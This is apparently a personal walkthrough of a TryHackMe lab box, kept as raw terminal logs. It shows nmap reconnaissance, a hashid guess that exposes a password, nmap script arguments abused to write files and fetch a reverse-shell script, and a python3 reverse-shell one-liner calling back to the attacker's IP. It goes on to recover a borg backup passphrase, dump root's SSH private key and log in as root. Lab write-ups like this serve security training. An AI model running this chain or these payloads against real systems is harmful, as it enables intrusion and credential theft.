@@ -1,0 +1,408 @@
+may26 10:33AM
+
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ nmap -sC -sV -A 10.10.242.27
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-26 10:33 IST
+Nmap scan report for 10.10.242.27
+Host is up (0.27s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c8:f2:71:60:0d:aa:f9:a0:d1:01:e5:61:30:97:ba:f7 (ECDSA)
+|_  256 11:23:45:6f:40:7a:9c:e4:d4:f1:05:ac:45:d5:ff:1a (ED25519)
+3000/tcp open  ssl/ppp?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP, GenericLines, RPCCheck, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|   GetRequest: 
+|     HTTP/1.0 301 Moved Permanently
+|     Location: https://localhost/scans
+|     Content-Type: text/html
+|     Cache-Control: no-cache
+|     X-Request-Id: 0eff577f-b60b-4802-8b5b-23d7564183ec
+|     X-Runtime: 0.000746
+|     Strict-Transport-Security: max-age=31536000; includeSubDomains
+|     Content-Length: 89
+|     <html><body>You are being <a href="https://localhost/scans">redirected</a>.</body></html>
+|   HTTPOptions: 
+|     HTTP/1.0 404 Not Found
+|     Content-Type: text/html; charset=UTF-8
+|     X-Request-Id: 53ebbb0d-a7be-49c6-aa58-514167512f46
+|     X-Runtime: 0.002834
+|     Strict-Transport-Security: max-age=31536000; includeSubDomains
+|     Content-Length: 1722
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <title>The page you were looking for doesn't exist (404)</title>
+|     <meta name="viewport" content="width=device-width,initial-scale=1">
+|     <style>
+|     .rails-default-error-page {
+|     background-color: #EFEFEF;
+|     color: #2E2F30;
+|     text-align: center;
+|     font-family: arial, sans-serif;
+|     margin: 0;
+|     .rails-default-error-page div.dialog {
+|     width: 95%;
+|     max-width: 33em;
+|     margin: 4em auto 0;
+|     .rails-default-error-page div.dialog > div {
+|     border: 1px solid #CCC;
+|     border-right-color: #999;
+|     border-left-color: #999;
+|     border-bottom-color: #BBB;
+|     border-top: #B00100 solid 4px;
+|_    border-top-left-radius: 9p
+| ssl-cert: Subject: commonName=None/organizationName=evait/stateOrProvinceName=None/countryName=DE
+| Not valid before: 2020-09-30T22:19:49
+|_Not valid after:  2021-09-30T22:19:49
+|_ssl-date: TLS randomness does not represent time
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.91%T=SSL%I=7%D=5/26%Time=60ADD733%P=x86_64-pc-linux-gn
+SF:u%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Get
+SF:Request,16D,"HTTP/1\.0\x20301\x20Moved\x20Permanently\r\nLocation:\x20h
+SF:ttps://localhost/scans\r\nContent-Type:\x20text/html\r\nCache-Control:\
+SF:x20no-cache\r\nX-Request-Id:\x200eff577f-b60b-4802-8b5b-23d7564183ec\r\
+SF:nX-Runtime:\x200\.000746\r\nStrict-Transport-Security:\x20max-age=31536
+SF:000;\x20includeSubDomains\r\nContent-Length:\x2089\r\n\r\n<html><body>Y
+SF:ou\x20are\x20being\x20<a\x20href=\"https://localhost/scans\">redirected
+SF:</a>\.</body></html>")%r(HTTPOptions,79B,"HTTP/1\.0\x20404\x20Not\x20Fo
+SF:und\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Request-Id:\x2
+SF:053ebbb0d-a7be-49c6-aa58-514167512f46\r\nX-Runtime:\x200\.002834\r\nStr
+SF:ict-Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\nCo
+SF:ntent-Length:\x201722\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x
+SF:20<title>The\x20page\x20you\x20were\x20looking\x20for\x20doesn't\x20exi
+SF:st\x20\(404\)</title>\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"
+SF:width=device-width,initial-scale=1\">\n\x20\x20<style>\n\x20\x20\.rails
+SF:-default-error-page\x20{\n\x20\x20\x20\x20background-color:\x20#EFEFEF;
+SF:\n\x20\x20\x20\x20color:\x20#2E2F30;\n\x20\x20\x20\x20text-align:\x20ce
+SF:nter;\n\x20\x20\x20\x20font-family:\x20arial,\x20sans-serif;\n\x20\x20\
+SF:x20\x20margin:\x200;\n\x20\x20}\n\n\x20\x20\.rails-default-error-page\x
+SF:20div\.dialog\x20{\n\x20\x20\x20\x20width:\x2095%;\n\x20\x20\x20\x20max
+SF:-width:\x2033em;\n\x20\x20\x20\x20margin:\x204em\x20auto\x200;\n\x20\x2
+SF:0}\n\n\x20\x20\.rails-default-error-page\x20div\.dialog\x20>\x20div\x20
+SF:{\n\x20\x20\x20\x20border:\x201px\x20solid\x20#CCC;\n\x20\x20\x20\x20bo
+SF:rder-right-color:\x20#999;\n\x20\x20\x20\x20border-left-color:\x20#999;
+SF:\n\x20\x20\x20\x20border-bottom-color:\x20#BBB;\n\x20\x20\x20\x20border
+SF:-top:\x20#B00100\x20solid\x204px;\n\x20\x20\x20\x20border-top-left-radi
+SF:us:\x209p")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\
+SF:n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVe
+SF:rsionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 337.77 seconds
+                                      
+use dir bruteforce or check github sources
+find dir 
+
+                                      
+https://10.10.242.27:3000/notes/1
+
+
+Text: Hi Paul, for security reasons I added hashids with a length of 30 characters to notes. I stored the password for this envizon instance in the note with id 380 and sent you the link by email. We may should consider to add more security layers to this gem (https://github.com/dtaniwaki/acts_as_hashids) 
+                                      
+                                      
+                                      
+                                                               
+─(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ git clone https://github.com/benwilber/bashids
+Cloning into 'bashids'...
+remote: Enumerating objects: 129, done.
+remote: Total 129 (delta 0), reused 0 (delta 0), pack-reused 129
+Receiving objects: 100% (129/129), 28.60 KiB | 2.86 MiB/s, done.
+Resolving deltas: 100% (61/61), done.
+                                                                                
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ cd bashids 
+                                                                                
+┌──(kevin㉿kali)-[~/CTF/THM/envizon/bashids]
+└─$ ./bashids -e -s "Note" -l 30 380
+y2a419eKDBLRvEYobWNpw0jnr6xlAX
+
+https://10.10.242.27:3000/notes/y2a419eKDBLRvEYobWNpw0jnr6xlAX
+
+Text: Password for envizon: rE8Z*qyM!DTKNP8fGu4T3CtW*aurBQwLF 
+
+
+
+login and go manual scan
+
+
+
+nmap -p 8080 --script http-put --script-args http-put.url=/,http-put.file=/root/local.txt
+
+
+──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ socat -v tcp-listen:8080,reuseaddr,fork gopen:/home/kevin/CTF/THM/envizon/local.txt,seek-end=0,append
+> 2021/05/26 11:12:03.779567  length=236 from=0 to=235
+PUT / HTTP/1.1\r
+Connection: close\r
+Content-Length: 33\r
+User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r
+Host: ip-10-8-1-147.eu-west-1.compute.internal:8080\r
+\r
+7953ba7f83b3fd00279627de052bc078
+
+
+
+──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ wget 'https://raw.githubusercontent.com/SurajDadral/nmap-reverse-shell/main/reverse_shell.nse' 
+--2021-05-26 11:14:46--  https://raw.githubusercontent.com/SurajDadral/nmap-reverse-shell/main/reverse_shell.nse
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 477 [text/plain]
+Saving to: ‘reverse_shell.nse’
+
+reverse_shell.nse   100%[===================>]     477  --.-KB/s    in 0s      
+
+2021-05-26 11:14:47 (6.06 MB/s) - ‘reverse_shell.nse’ saved [477/477]
+
+
+upload revershell
+
+using nmap parameter
+
+
+-p 8080 --script http-fetch --script-args http-fetch.destination=/tmp/reverse_shell,http-fetch.url=reverse_shell.nse
+
+──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ php -S 0.0.0.0:8080                                                     1 ⨯
+[Wed May 26 11:16:46 2021] PHP 7.4.15 Development Server (http://0.0.0.0:8080) started
+[Wed May 26 11:18:27 2021] 10.10.242.27:50492 Accepted
+[Wed May 26 11:18:27 2021] 10.10.242.27:50492 [404]: (null) / - No such file or directory
+[Wed May 26 11:18:27 2021] 10.10.242.27:50492 Closing
+[Wed May 26 11:18:31 2021] 10.10.242.27:50494 Accepted
+[Wed May 26 11:18:31 2021] 10.10.242.27:50494 [200]: (null) /reverse_shell.nse
+[Wed May 26 11:18:31 2021] 10.10.242.27:50494 Closing
+
+now get revshell using nmap parameter
+
+-p 5000 --script /tmp/reverse_shell/10.8.1.147/8080/reverse_shell.nse
+
+
+
+
+──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ nc -nlvp 8080      
+listening on [any] 8080 ...
+connect to [10.8.1.147] from (UNKNOWN) [10.10.242.27] 50512
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.1.147",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+get good shell using another shell cmd 
+
+
+always check backup :)
+──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ nc -nlvp 1234
+listening on [any] 1234 ...
+connect to [10.8.1.147] from (UNKNOWN) [10.10.242.27] 44742
+/bin/sh: can't access tty; job control turned off
+/usr/src/app/envizon # cd /var/backup         
+/var/backup # ls -la
+total 80
+drwxr-xr-x    3 root     root          4096 Sep 30  2020 .
+drwxr-xr-x    1 root     root          4096 Sep 30  2020 ..
+-rw-------    1 root     root            73 Sep 30  2020 README
+-rw-------    1 root     root           700 Sep 30  2020 config
+drwx------    3 root     root          4096 Sep 30  2020 data
+-rw-------    1 root     root            59 Sep 30  2020 hints.17
+-rw-------    1 root     root         41258 Sep 30  2020 index.17
+-rw-------    1 root     root           190 Sep 30  2020 integrity.17
+-rw-------    1 root     root            16 Sep 30  2020 nonce
+/var/backup # cat README
+This is a Borg Backup repository.
+See https://borgbackup.readthedocs.io/
+/var/backup # crontab -l
+# do daily/weekly/monthly maintenance
+# min	hour	day	month	weekday	command
+*/15	*	*	*	*	run-parts /etc/periodic/15min
+0	*	*	*	*	run-parts /etc/periodic/hourly
+0	2	*	*	*	run-parts /etc/periodic/daily
+0	3	*	*	6	run-parts /etc/periodic/weekly
+0	5	1	*	*	run-parts /etc/periodic/monthly
+
+/var/backup # cat /etc/periodic/*/*    
+#!/bin/sh
+
+# todo: implement daily backup with borgmatic. current config is wip
+# borgmatic
+/var/backup # find / -iname borgmatic
+/etc/borgmatic
+/usr/lib/python3.8/site-packages/borgmatic
+/usr/bin/borgmatic
+/var/backup#cd /tmp
+/tmp # ls /etc/borgmatic
+config.yaml
+/tmp # cat /etc/borgmatic/config.yaml
+# Where to look for files to backup, and where to store those backups.
+# See https://borgbackup.readthedocs.io/en/stable/quickstart.html and
+# https://borgbackup.readthedocs.io/en/stable/usage/create.html
+# for details.
+location:
+    # List of source directories to backup (required). Globs and
+    # tildes are expanded.
+    source_directories:
+        - /root
+
+    # Paths to local or remote repositories (required). Tildes are
+    # expanded. Multiple repositories are backed up to in
+    # sequence. See ssh_command for SSH options like identity file
+    # or port.
+    repositories:
+        - /var/backup
+
+retention:
+    # Retention policy for how many backups to keep.
+    keep_daily: 7
+    keep_weekly: 4
+    keep_monthly: 6
+
+storage:
+    encryption_passcommand: 'echo 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ'
+/tmp # borg list /var/backup 
+/usr/lib/python3.8/getpass.py:91: GetPassWarning: Can not control echo on the terminal.
+Warning: Password input may be echoed.
+Enter passphrase for key /var/backup: 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ
+
+envizon-2020-09-30T23:25:30.466049   Wed, 2020-09-30 23:25:31 [b2aae5e7803b2134e2dc913b10b03430a4b892c3b32dd2f1556175f51e85c8bc]
+envizon-2020-09-30T23:26:23.900026   Wed, 2020-09-30 23:26:25 [d027cf90321085f4cf1b1f1883c7287051f8350568ae1ecf421b52fb906f91a3]
+
+/tmp # borg extract /var/backup::envizon-2020-09-30T23:25:30.466049
+/usr/lib/python3.8/getpass.py:91: GetPassWarning: Can not control echo on the terminal.
+Warning: Password input may be echoed.
+Enter passphrase for key /var/backup: 4bikDP8iaCEvgYksIKPUmACEwGYPcnlQ
+
+/tmp # ls
+reverse_shell
+root
+/tmp # cd root
+/tmp/root # ls -la
+total 36
+drwx------    6 root     root          4096 Sep 30  2020 .
+drwxrwxrwt    1 root     root          4096 May 26 06:25 ..
+-rw-------    1 root     root           640 Sep 30  2020 .ash_history
+drwxr-xr-x    3 root     root          4096 Sep 30  2020 .bundle
+drwx------    2 root     root          4096 Sep 30  2020 .cache
+drwx------    3 root     root          4096 Sep 30  2020 .config
+-rw-r--r--    1 root     root            19 Sep 30  2020 .gemrc
+drwxr-xr-x    2 root     root          4096 Sep 30  2020 .ssh
+-rw-r--r--    1 root     root            33 Sep 30  2020 local.txt
+/tmp/root # cat local.txt
+7953ba7f83b3fd00279627de052bc078
+/tmp/root # ls .ssh
+id_ed25519
+/tmp/root # cat ssh/id_ed25519
+cat: can't open 'ssh/id_ed25519': No such file or directory
+/tmp/root # cd ssh
+/bin/sh: lscd: can't cd to ssh: No such file or directory
+/tmp/root # ls
+/bin/sh: lsls: not found
+/tmp/root # ls -la
+total 36
+drwx------    6 root     root          4096 Sep 30  2020 .
+drwxrwxrwt    1 root     root          4096 May 26 06:25 ..
+-rw-------    1 root     root           640 Sep 30  2020 .ash_history
+drwxr-xr-x    3 root     root          4096 Sep 30  2020 .bundle
+drwx------    2 root     root          4096 Sep 30  2020 .cache
+drwx------    3 root     root          4096 Sep 30  2020 .config
+-rw-r--r--    1 root     root            19 Sep 30  2020 .gemrc
+drwxr-xr-x    2 root     root          4096 Sep 30  2020 .ssh
+-rw-r--r--    1 root     root            33 Sep 30  2020 local.txt
+/tmp/root # cd .ssh
+/tmp/root/.ssh # ls -la
+total 12
+drwxr-xr-x    2 root     root          4096 Sep 30  2020 .
+drwx------    6 root     root          4096 Sep 30  2020 ..
+-rw-------    1 root     root           399 Sep 30  2020 id_ed25519
+/tmp/root/.ssh # cat id_ed25519
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrwAAAJAvZlysL2Zc
+rAAAAAtzc2gtZWQyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrw
+AAAECHtx9vNOYFDdz7iupS9Ra9EL6dFNFyxYvRc+pl/n74GFzrdGMtiZlaGXMNSAmXhRNn
+QDL8YE+Bxmgo5hmKhFCvAAAADHJvb3RAZW52aXpvbgE=
+-----END OPENSSH PRIVATE KEY-----
+/tmp/root/.ssh # 
+
+
+
+  
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ echo '-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrwAAAJAvZlysL2Zc
+rAAAAAtzc2gtZWQyNTUxOQAAACBc63RjLYmZWhlzDUgJl4UTZ0Ay/GBPgcZoKOYZioRQrw
+AAAECHtx9vNOYFDdz7iupS9Ra9EL6dFNFyxYvRc+pl/n74GFzrdGMtiZlaGXMNSAmXhRNn
+QDL8YE+Bxmgo5hmKhFCvAAAADHJvb3RAZW52aXpvbgE=
+-----END OPENSSH PRIVATE KEY-----' > id_rsa
+                                                                                
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ chmod 600 id_rsa
+                                                                                
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ ls -la
+total 44
+drwxr-xr-x   3 kevin kevin  4096 May 26 11:59 .
+drwxrwxrwx 199 kevin kevin 12288 May 26 10:33 ..
+drwxr-xr-x   3 kevin kevin  4096 May 26 10:47 bashids
+-rw-------   1 kevin kevin   399 May 26 11:59 id_rsa
+-rw-r--r--   1 kevin kevin  1270 May 26 11:12 local.txt
+-rw-r--r--   1 kevin kevin  6365 May 26 11:03 read.me
+-rw-r--r--   1 kevin kevin   477 May 26 11:14 reverse_shell.nse
+-rw-r--r--   1 kevin kevin    46 May 26 11:30 upload.lua
+                                                                                
+┌──(kevin㉿kali)-[~/CTF/THM/envizon]
+└─$ ssh -i ./id_rsa root@10.10.242.27                              
+The authenticity of host '10.10.242.27 (10.10.242.27)' can't be established.
+ECDSA key fingerprint is SHA256:RRmjwv/Y9SYlzmEIguxj1tnYn+N12wyjNyGQmxA3iAQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.242.27' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed May 26 06:30:04 UTC 2021
+
+  System load:  0.08              Users logged in:                0
+  Usage of /:   69.9% of 8.78GB   IP address for eth0:            10.10.242.27
+  Memory usage: 46%               IP address for docker0:         172.17.0.1
+  Swap usage:   0%                IP address for br-8e2d0e758272: 172.18.0.1
+  Processes:    117
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+Last login: Sat Oct  3 07:58:16 2020 from 192.168.1.28
+root@envizon:~# ls -la
+total 44
+drwx------  8 root root 4096 Sep 30  2020 .
+drwxr-xr-x 24 root root 4096 Sep 30  2020 ..
+lrwxrwxrwx  1 root root    9 Sep 30  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+drwx------  2 root root 4096 Sep 30  2020 .cache
+drwxr-xr-x 20 root root 4096 Sep 30  2020 envizon_thm
+drwx------  3 root root 4096 Sep 30  2020 .gnupg
+drwxr-xr-x  3 root root 4096 Sep 30  2020 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--------  1 root root   33 Sep 30  2020 root.txt
+drwxr-xr-x  3 root root 4096 Sep 30  2020 snap
+drwx------  2 root root 4096 Sep 30  2020 .ssh
+root@envizon:~# cat root.txt
+40963d170c949f8325783c552e150236
+root@envizon:~# 
+
+
+
+
